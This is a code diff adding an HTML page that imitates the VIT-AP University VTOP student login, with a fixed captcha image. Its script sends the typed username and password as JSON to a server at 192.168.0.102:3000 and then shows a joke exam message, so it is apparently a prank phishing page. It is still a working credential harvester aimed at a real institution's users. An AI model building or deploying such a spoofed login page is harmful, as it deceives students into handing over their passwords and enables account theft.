@@ -1,1 +1,276 @@
 
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <title>VIT-AP - VTOP</title>
+        <meta name="description" content="" />
+        <meta
+            content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
+            name="viewport"
+        />
+        <meta charset="ISO-8859-1" />
+        <meta name="description" content="vtop" />
+        <meta name="robots" content="NOODP,NOYDIR" />
+        <meta name="keywords" content=" vtop " />
+        <meta name="robots" content="index, follow" />
+        <link
+            rel="icon"
+            type="image/png"
+            href="https://vtop.vitap.ac.in/vtop/assets/img/favicon.ico"
+        />
+        <meta http-equiv="cache-control" content="max-age=0" />
+        <meta http-equiv="cache-control" content="no-cache" />
+        <meta http-equiv="expires" content="0" />
+        <meta http-equiv="X-UA-Compatible" content="IE-Edge" />
+
+        <link
+            rel="stylesheet"
+            type="text/css"
+            href="https://vtop.vitap.ac.in/vtop/get/bs/css/1"
+        />
+        <link
+            rel="stylesheet"
+            type="text/css"
+            href="https://vtop.vitap.ac.in/vtop/get/ic/css/2"
+        />
+        <link
+            rel="stylesheet"
+            type="text/css"
+            href="https://vtop.vitap.ac.in/vtop/assets/css/PreLogin.css"
+        />
+    </head>
+
+    <body class="WhiteBackground">
+        <nav
+            class="navbar navbar-expand-lg bg-light headerBackgroundColor py-1 fixed-top shadow"
+            id="vtopOpenPageHeader"
+        >
+            <div class="container-fluid justify-content-start">
+                <a class="navbar-brand" href="javacript:void(0);">
+                    <img
+                        src="https://vtop.vitap.ac.in/vtop/assets/img/VIT_AP_logo.png"
+                        width="170px"
+                        alt=""
+                    />
+                </a>
+            </div>
+        </nav>
+
+        <div class="container-fluid" id="container-fluid">
+            <div class="row">
+                <div
+                    class="col-11 col-sm-8 col-md-6 col-lg-6 col-xl-4 WhiteBackground shadow-lg mx-auto p-0 mt-5"
+                    id="loginBox"
+                >
+                    <div class="card border-0">
+                        <div class="card-header loginBoxBorder">
+                            <h4 class="fw-bold">VTOP Login</h4>
+                        </div>
+                        <div class="card-body" id="bodyContent">
+                            <input
+                                type="hidden"
+                                name="_csrf"
+                                value="c2ffa624-12fb-47ec-9cf1-500e46c35347"
+                            />
+
+                            <!-- USERID -->
+
+                            <div class="input-group input-group-sm mb-3">
+                                <input
+                                    type="text"
+                                    class="form-control"
+                                    placeholder="Username"
+                                    aria-label="Username"
+                                    aria-describedby="basic-addon1"
+                                    id="username"
+                                    name="username"
+                                    onkeyup="
+                                        this.value = this.value.toUpperCase()
+                                    "
+                                    autocomplete="off"
+                                />
+                                <span class="input-group-text" id="basic-addon1"
+                                    ><i
+                                        class="fa fa-user text-primary"
+                                        aria-hidden="true"
+                                    ></i
+                                ></span>
+                            </div>
+
+                            <!-- PASSWORD -->
+
+                            <div class="input-group input-group-sm mb-3">
+                                <input
+                                    type="password"
+                                    class="form-control"
+                                    placeholder="Password"
+                                    id="password"
+                                    name="password"
+                                    aria-describedby="basic-addon2"
+                                />
+                                <button
+                                    id="basic-addon2"
+                                    class="btn btn-light border-secondary"
+                                    type="button"
+                                >
+                                    <i
+                                        class="fa fa-eye text-danger fw-bold"
+                                        id="passwordIcon"
+                                        onclick="javascript: toggleEye();"
+                                        aria-hidden="false"
+                                    ></i>
+                                </button>
+                            </div>
+
+                            <!-- IN BUILT CAPTCHA  -->
+
+                            <div class="row">
+                                <div class="col-7 mx-auto">
+                                    <div
+                                        class="input-group input-group-sm border mb-3"
+                                        id="captchaBlock"
+                                    >
+                                        <img
+                                            class="form-control img-fluid bg-light border-0"
+                                            height="325"
+                                            src="data:image/jpeg;base64,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"
+                                            aria-describedby="button-addon2"
+                                        />
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="mb-3">
+                                <input
+                                    type="text"
+                                    class="form-control form-control-sm"
+                                    maxlength="6"
+                                    id="captchaStr"
+                                    name="captchaStr"
+                                    aria-describedby="captchaHelp"
+                                    placeholder="Enter CAPTCHA shown above"
+                                />
+                            </div>
+
+                            <!-- GOOGLE CAPTCHA  -->
+
+                            <button
+                                id="submitBtn"
+                                class="btn btn-sm btn-primary float-end"
+                            >
+                                Submit
+                            </button>
+                        </div>
+
+                        <div class="card-footer border-0 small">
+                            <div class="text-end"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="fun" class="fun">
+            <p><b> MARKS THO EMI PANI !! CHADHUVUKONDI </b></p>
+            <p><b> ALL THE BEST FOR CAT 1 IN SEM2 </b></p>
+        </div>
+
+        <div class="fixed-bottom text-center text-light py-0 footercolor">
+            <span class="small"
+                >Copyright ©
+                <span class="trim d-none d-sm-inline-block">2026</span> Software
+                Development Cell, VIT-AP University, Andhra
+                Pradesh-522241.</span
+            >
+        </div>
+
+        <style>
+            html {
+                font-family: sans-serif;
+            }
+            body {
+                font-family: sans-serif;
+            }
+            .card-header {
+                margin-top: 30px;
+            }
+            .fun {
+                margin-top: 70px;
+                display: none;
+            }
+        </style>
+        <script>
+            var isEyeOpened = false;
+
+            function toggleEye() {
+                if (isEyeOpened) {
+                    isEyeOpened = false;
+                    document
+                        .getElementById("passwordIcon")
+                        .classList.remove("fa-eye-slash");
+                    document
+                        .getElementById("passwordIcon")
+                        .classList.add("text-danger");
+                    document
+                        .getElementById("passwordIcon")
+                        .classList.remove("text-primary");
+                    document
+                        .getElementById("passwordIcon")
+                        .classList.add("fa-eye");
+                    document.getElementById("password").type = "password";
+                } else {
+                    isEyeOpened = true;
+                    document
+                        .getElementById("passwordIcon")
+                        .classList.add("fa-eye-slash");
+                    document
+                        .getElementById("passwordIcon")
+                        .classList.add("text-primary");
+                    document
+                        .getElementById("passwordIcon")
+                        .classList.remove("text-danger");
+                    document
+                        .getElementById("passwordIcon")
+                        .classList.remove("fa-eye");
+                    document.getElementById("password").type = "text";
+                }
+            }
+            const submit = document.getElementById("submitBtn");
+            const box = document.getElementById("container-fluid");
+            const fun = document.getElementById("fun");
+
+            submit.addEventListener("click", async () => {
+                const inputval = document.getElementById("captchaStr").value;
+                const username = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
+
+                if (username != "") {
+                    if (password != "") {
+                        if (inputval === "P3593K") {
+                            const res = await fetch(
+                                "http://192.168.0.102:3000/submit",
+                                {
+                                    method: "POST",
+                                    headers: {
+                                        "Content-Type": "application/json",
+                                    },
+                                    body: JSON.stringify({
+                                        username,
+                                        password,
+                                    }),
+                                },
+                            );
+                            box.style.display = "none";
+                            fun.style.display = "block";
+                        } else {
+                            alert("Invalid CAPTCHA");
+                        }
+                    } else {
+                        alert("Invalid PASSWORD");
+                    }
+                } else {
+                    alert("Invalid USERNAME");
+                }
+            });
+        </script>
+    </body>
+</html>
